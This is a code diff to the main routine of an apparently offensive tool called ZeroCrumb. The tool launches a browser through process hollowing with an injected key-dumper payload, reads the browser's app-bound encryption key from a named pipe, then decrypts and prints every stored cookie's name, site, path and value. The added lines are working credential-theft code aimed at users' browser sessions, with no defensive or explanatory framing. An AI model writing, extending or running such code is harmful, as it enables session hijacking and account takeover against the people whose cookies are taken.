@@ -4,12 +4,12 @@
 #include "./src/comm/comm.h"
 #include "./src/hollowing/hollowing.h"
 #include "./src/config/config.h"
-#include "./src/dbg/dbg.h"
+#include "./src/utils/utils.h"
 
+#include "./src/decryptor/content/content.h"
 
 int main(int argc, char* argv[])
 {
-
     if (argc < 2) {
         printf("Usage: ZeroCrumb.exe <BROWSER_TYPE>\n");
         return -1;
@@ -38,26 +38,45 @@ int main(int argc, char* argv[])
         return -1;
     }
     
-
     SIZE_T payloadSize;
     PBYTE payload = hollowing::getPayloadBuffer(config::keyDumperPath.c_str(), payloadSize);
-    hollowing::hollow(browserConfig.exePath.c_str(), payload, payloadSize);
+
+    auto exePath = browserConfig.exePath;
+
+    if (!hollowing::hollow(exePath.c_str(), payload, payloadSize)) {
+        printf("[-] Failed To Spawn Hollowed Browser Instance.\n");
+        return -1;
+    }
 
     printf("[*] Reading ABK From ZeroCrumb Named Pipe...\n");
 
     Sleep(250);
 
     HANDLE pipe = comm::connectToPipe();
-    PBYTE key = comm::readAppBoundKey(pipe); // can use in cookie decryption code
+    PBYTE key = comm::readAppBoundKey(pipe);
 
     if (!key) {
         printf("[-] Failed To Read Key From Zero Crumb Named Pipe.\n");
+        return -1;
     }
-    else {
-        string strKey = dbg::getHexABK(key);
 
-        printf("[+] App Bound Key Address: 0x%p\n", key);
-        printf("[+] App Bound Key: %s\n", strKey.c_str());
+    decryptor::initSodium();
+
+    auto cookiesPath = browserConfig.cookiesPath;
+    auto reader = new CookieReader(cookiesPath.c_str(), key);
+
+    reader->initSqliteDb();
+    reader->prepare(queries::cookies);
+    reader->populateCookies();
+    
+    for (auto& cookie : reader->cookies) {
+
+        string name = cookie->name;
+        string site = cookie->site;
+        string path = cookie->path;
+        string cookieValue = cookie->cookie;
+
+        printf("============\nName: %s\nSite: %s\nPath: %s\nCookie: %s\n", name.c_str(), site.c_str(), path.c_str(), cookieValue.c_str());
     }
 
 }
